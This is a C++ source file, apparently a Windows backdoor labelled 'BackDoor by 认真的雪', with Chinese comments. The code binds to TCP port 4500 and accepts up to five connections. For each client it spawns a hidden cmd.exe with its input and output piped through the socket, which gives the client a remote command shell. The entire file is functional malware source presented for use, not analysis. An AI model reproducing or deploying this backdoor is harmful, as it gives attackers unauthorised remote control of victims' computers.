// door.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

//cmdshell线程函数
DWORD WINAPI Thread( LPVOID lpParam )
{   
	SOCKET s=(SOCKET)lpParam;
	STARTUPINFO si;
	GetStartupInfo(&si);
    si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.wShowWindow=SW_HIDE;
	//使cmd的输入输出直接和socket关联
	si.hStdInput=si.hStdOutput=si.hStdError=(void*)s;
	char cmdline[256];
	//得到cmd路径
	GetSystemDirectory(cmdline,sizeof(cmdline));
	strcat(cmdline,"\\cmd.exe");
	PROCESS_INFORMATION ProcessInformation;
	int ret;
	//建立cmd进程
	ret=CreateProcess(NULL,cmdline,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation);
	//等待进程结束
	WaitForSingleObject(ProcessInformation.hProcess,INFINITE);
	CloseHandle(ProcessInformation.hProcess);
	return 0;
}



int main(int argc, char* argv[])
{
	char wMessage[512] = "\r\n========================  BackDoor by 认真的雪  ========================\r\n";
	//建立socket数组
	SOCKET sClient[5];
    //初始化socket，并且监听端口
	BYTE minorVer = 2; 
	BYTE majorVer = 2;
	WSADATA wsaData;
	WORD sockVersion = MAKEWORD(minorVer, majorVer);
	if(WSAStartup(sockVersion, &wsaData) != 0)
        return 0;
	SOCKET sListen = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	if(sListen == INVALID_SOCKET)
	{
		printf("socket error \n");
		return 0;
	}
	//设置socket属性
	sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(4500);
	sin.sin_addr.S_un.S_addr = INADDR_ANY;
	
	if(bind(sListen, (LPSOCKADDR)&sin, sizeof(sin)) == SOCKET_ERROR)
	{
		printf("bind error \n");
		return 0;
	}
	//监听端口，参数5表示最多只能接受五个连接
	if(listen(sListen, 5) == SOCKET_ERROR)
	{
		printf("listen error \n");
		return 0;
	}
	DWORD dwThreadId;
	//循环，用于接收连接，这里的循环次数和前面listen函数中的第二个参数要一致，
	//因为只能接收5个连接，循环一次接收一个连接，所以只能循环5次
	for(int i=0;i<5;i++)
	{
		//接收连接
        sClient[i]  =accept(sListen,NULL,NULL);
		//创建cmdshell进程
		CreateThread(NULL,NULL,Thread,(LPVOID)sClient[i],0,&dwThreadId);
		//发送欢迎消息
		send(sClient[i],wMessage,strlen(wMessage),0);
	}
	return 0;
}
